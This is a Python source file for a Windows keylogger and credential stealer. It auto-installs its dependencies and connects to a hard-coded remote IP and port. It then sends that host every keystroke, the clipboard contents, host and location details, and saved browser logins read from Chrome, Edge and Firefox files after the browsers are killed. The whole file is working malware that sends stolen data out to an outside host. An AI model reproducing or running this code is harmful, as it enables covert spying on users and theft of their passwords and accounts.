import importlib.util
import subprocess
libs = ['pynput', 'requests', 'psutil', 'win32clipboard']
for lib in libs:
    imported = importlib.util.find_spec(lib)
    if imported is None:
        try:
            subprocess.check_call(['pip','install',lib])
        except subprocess.CalledProcessError:
            pass
from pynput.keyboard import Listener, Key, KeyCode
import socket
import os
import sqlite3
import requests
import json
import psutil
import platform
import win32clipboard

class Keylogger:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.client = None

    def start_socket(self):
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.connect((self.ip, self.port))
        except socket.error as err:
            print(f"Socket creation error: {err}")

    def send_data(self, key):
        if isinstance(key, (Key, KeyCode)):
            try:
                key = str(key).replace("'", "") + '\n'
            except Exception:
                return
            try:
                self.client.send(key.encode('utf-8'))
            except socket.error as err:
                print(f"Failed to send data: {err}")
        elif isinstance(key, str):
            self.client.send(key.encode('utf-8'))
        elif isinstance(key, list):
            for i in key:
                self.client.send(str(i).encode('utf-8'))

    def clipboard_data(self):
        win32clipboard.OpenClipboard()
        cp_p = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        self.send_data(cp_p)
    
    def host_info(self):
        name = socket.gethostname()
        priv_ip = socket.gethostbyname(name)
        pub_data = json.loads(requests.get("https://ipinfo.io").text)
        processor = platform.processor()
        OS = platform.uname()[0]
        vers = platform.uname()[3]
        arch = platform.uname()[4]
        disk = psutil.disk_usage('/')
        total = disk.total / (1024 ** 3)
        used = disk.used / (1024 ** 3)
        free = disk.free / (1024 ** 3)
        perc = disk.percent
        v_mem= psutil.virtual_memory()
        v_total = v_mem.total / (1024 ** 3)
        v_used = v_mem.used / (1024 ** 3)
        v_av = v_mem.available / (1024 ** 3)
        v_free = v_mem.free / (1024 ** 3)
        v_perv = v_mem.percent
        self.send_data([
            f"host name is: {name}\nprivate ip is: {priv_ip}\npublic ip is: {pub_data['ip']}\nlived in: {pub_data['country']} {pub_data['city']}",
            f"processor: {processor}\noperating system: {OS}\narchiticture: {arch}\nVersion: {vers}",
            f"disk usage( total space: {total}\nused space: {used}\nfree space: {free}\n disk percentage: {perc}%)\n",
            f"total ram: {v_total}\nused:{v_used}\nfree:{v_free}\n available:{v_av}\npercentage: {v_perv}%"])
    def steal_pass(self):
        data = []
        flag = False
        moz_path = os.path.expanduser(
            r'~\AppData\Roaming\Mozilla\Firefox\Profiles')
        if os.path.exists(os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')):
            flag = True
        if os.path.exists(os.path.expanduser(r'~\AppData\Local\Microsoft\Edge')):
            edge_path = os.path.expanduser(
                r'~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data')
            if flag:
                chrome_path = os.path.expanduser(
                    r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
                paths = [edge_path, chrome_path]
            else:
                paths = [edge_path]
            for process in psutil.process_iter(['pid', 'name']):
                if 'msedge.exe' in process.info['name'].lower() or 'chrome.exe' in process.info['name'].lower():
                    process.kill()
            for path in paths:
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute(
                    'SELECT origin_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    url = row[0]
                    uname = row[1]
                    password = row[2]
                    if uname:
                        data.append(
                            f'\nwebapp: {url} Username: {uname} Password: {password}\n')
            cursor.close()
            conn.close()
        if os.path.exists(moz_path):
            for root, dirs, files in os.walk(moz_path):
                for file in files:
                    if file == "logins.json":
                        logins_data = None
                        full_path = os.path.join(root, file)
                        with open(full_path, 'r') as f:
                            logins_data = f.read()
                            logins_data = json.loads(logins_data)
                        for key, values in logins_data.items():
                            data.append(values)
        if data:
            self.send_data(data)
    def on_press(self, key):
        if str(key).find("Key.") == -1:
            self.send_data(key)
        else:
            self.send_data(f"special key {key}")

    def keylogger(self):
        try:
            with Listener(on_press=self.on_press) as listener:
                listener.join()
        except Exception as err:
            print(f"Error in keyboard monitoring: {err}")
        finally:
            if self.client:
                self.client.close()


if __name__ == "__main__":
    ke = Keylogger("20.173.64.5", 9999)
    ke.start_socket()
    # ke.host_info()
    # ke.clipboard_data()
    # ke.steal_pass()
    ke.keylogger()
